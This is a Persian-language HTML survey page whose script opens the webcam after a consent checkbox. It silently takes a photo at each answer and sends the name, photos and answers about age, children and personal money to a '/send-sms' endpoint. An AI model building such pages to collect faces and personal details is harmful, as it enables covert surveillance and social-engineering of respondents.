<!doctype html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <!-- CSP حذف شده -->
  <title>نظرسنجی کوتاه</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h2>📋 نظرسنجی کوتاه</h2>
  <p>لطفاً قبل از شروع، نام خود را وارد کنید و تیک رضایت را بزنید تا دوربین فعال شود.</p>

  <div id="intro">
    <label>نام شما:
      <input id="nameInput" type="text" placeholder="نام خود را بنویسید..." required />
    </label>
    <br>
    <label><input id="agree" type="checkbox"> موافقم عکس گرفته شود</label>
    <br>
    <button id="start" disabled>شروع نظرسنجی</button>
  </div>

  <div id="questionArea" class="hidden">
    <div id="qText"></div>
    <div id="qOptions"></div>
    <button id="next" disabled>بعدی</button>
    <button id="finish" class="hidden">پایان — ارسال اطلاعات</button>
    <p id="status"></p>
  </div>

  <script>
    const questions = [
      { key: 'age', text: 'چند سال دارید؟', options: ['بین ۲۰ تا ۳۰', 'بین ۳۰ تا ۴۰', 'بین ۴۰ تا ۵۰'] },
      { key: 'children', text: 'چند تا بچه دارید؟', options: ['۱', '۲ تا ۳', '۴ تا بیشتر'] },
      { key: 'animal', text: 'کدام حیوان را دوست دارید؟', options: ['سگ', 'گربه', 'لاک‌پشت'] },
      { key: 'city', text: 'کدام شهر را ترجیح می‌دهید؟', options: ['کیش', 'شمال', 'تبریز'] },
      { key: 'money', text: 'در حال حاضر چقدر پول دارید؟', options: ['۱۰', '۱۰۰', '۱۰۰۰'] },
    ];

    const nameInput = document.getElementById('nameInput');
    const agree = document.getElementById('agree');
    const startBtn = document.getElementById('start');
    const qText = document.getElementById('qText');
    const qOptions = document.getElementById('qOptions');
    const questionArea = document.getElementById('questionArea');
    const nextBtn = document.getElementById('next');
    const finishBtn = document.getElementById('finish');
    const status = document.getElementById('status');

    let stream = null;
    let video = null;
    let canvas = null;
    let ctx = null;
    let current = 0;
    let answers = {};
    let photos = [];

    function updateStartButton() {
      startBtn.disabled = !(agree.checked && nameInput.value.trim().length > 1);
    }

    agree.addEventListener('change', updateStartButton);
    nameInput.addEventListener('input', updateStartButton);

    startBtn.addEventListener('click', async () => {
      try {
        status.textContent = 'در حال درخواست دسترسی به دوربین...';
        video = document.createElement('video');
        video.autoplay = true;
        video.playsInline = true;
        canvas = document.createElement('canvas');
        ctx = canvas.getContext('2d');
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 1000));
        document.getElementById('intro').classList.add('hidden');
        questionArea.classList.remove('hidden');
        renderQuestion();
        status.textContent = '';
      } catch (e) {
        status.textContent = 'دسترسی به دوربین داده نشد: ' + e.message;
        console.error('خطای دوربین:', e);
      }
    });

    function renderQuestion() {
      const q = questions[current];
      qText.textContent = q.text;
      qOptions.innerHTML = '';
      q.options.forEach(opt => {
        const b = document.createElement('button');
        b.textContent = opt;
        b.onclick = ()=> selectOption(opt, b);
        qOptions.appendChild(b);
      });
      nextBtn.disabled = true;
      finishBtn.classList.add('hidden');
      status.textContent = 'لطفاً یک گزینه انتخاب کنید';
    }

    async function selectOption(opt, btn){
      document.querySelectorAll('#qOptions button').forEach(b=> b.classList.remove('selected'));
      btn.classList.add('selected');

      answers[questions[current].key] = opt;
      nextBtn.disabled = false;
      status.textContent = 'در حال گرفتن عکس...';
      
      try {
        const dataUrl = await takePhoto();
        photos.push(dataUrl);
        status.textContent = '📸 عکس گرفته شد - برای ادامه "بعدی" را بزنید';
      } catch (error) {
        status.textContent = '❌ خطا در گرفتن عکس: ' + error.message;
        console.error('خطای عکس‌برداری:', error);
      }
    }

    function takePhoto(){
      return new Promise((resolve, reject) => {
        try {
          if (!video || !canvas || !ctx) {
            throw new Error('دوربین آماده نیست');
          }
          
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
          resolve(dataUrl);
        } catch (error) {
          reject(error);
        }
      });
    }

    nextBtn.addEventListener('click', ()=>{
      current++;
      if(current >= questions.length){
        qText.textContent = 'پرسش‌ها تمام شد — روی "پایان" کلیک کنید.';
        qOptions.innerHTML = '';
        nextBtn.disabled = true;
        finishBtn.classList.remove('hidden');
        status.textContent = 'برای ارسال اطلاعات روی "پایان" کلیک کنید';
      } else {
        renderQuestion();
      }
    });

    finishBtn.addEventListener('click', async ()=>{
      status.textContent = 'در حال ارسال اطلاعات...';
      
      try {
        const payload = { 
          name: nameInput.value.trim(), 
          answers, 
          photos 
        };

        const res = await fetch('/send-sms', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        
        const result = await res.json();
        
        if (result.ok) {
          status.textContent = '✅ ارسال موفق — ممنون از مشارکت شما';
          status.style.background = 'linear-gradient(135deg, #c6f6d5, #9ae6b4)';
          status.style.borderColor = '#48bb78';
          status.style.color = '#22543d';
          
          finishBtn.disabled = true;
          nextBtn.disabled = true;
        } else {
          status.textContent = '⚠️ خطا: ' + result.error;
        }
      } catch(err){
        status.textContent = '❌ خطا در اتصال به سرور: ' + err.message;
        console.error('خطای ارسال:', err);
      } finally {
        if(stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      }
    });

    window.addEventListener('error', (event) => {
      console.error('خطای全局:', event.error);
    });
  </script>
</body>
</html>
